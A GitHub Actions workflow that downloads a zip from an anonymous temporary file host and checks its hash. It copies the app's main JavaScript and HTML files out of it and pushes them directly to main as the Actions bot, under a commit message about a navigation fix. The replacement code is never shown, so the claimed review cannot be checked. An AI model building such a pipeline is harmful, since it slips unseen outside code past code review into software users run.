name: Apply reviewed HSN hash-navigation fix
on:
  workflow_dispatch:
permissions:
  contents: write
concurrency:
  group: hsn-reviewed-hash-fix
  cancel-in-progress: false
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 2
      - name: Apply exact reviewed files
        env:
          PACKAGE_URL: https://litter.catbox.moe/ee0vxu.zip
        run: |
          set -euo pipefail
          baseline=898f667a32810e190f5043340fdb9cdadeb028ee
          test "$(git rev-parse HEAD^)" = "$baseline"
          test "$(git diff --name-only "$baseline" HEAD)" = '.github/workflows/deploy-update.yml'
          test "$(git ls-remote origin refs/heads/main | cut -f1)" = "$(git rev-parse HEAD)"
          curl --fail --location --retry 2 "$PACKAGE_URL" -o /tmp/package.zip
          echo '000f067e2bbddbb31662866ec980c6b37e1fdc8f174a2dc0af9bb39cd446a792  /tmp/package.zip' | sha256sum -c -
          unzip -q /tmp/package.zip -d /tmp/replacement
          package=/tmp/replacement/finder-hash-fix-2026-10-01
          for file in src/app.js index.html offline.html; do
            test -f "$package/$file"
            cp "$package/$file" "$file"
            git add -- "$file"
          done
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git commit -m 'Fix detail navigation when URL hash changes'
          git push origin HEAD:main
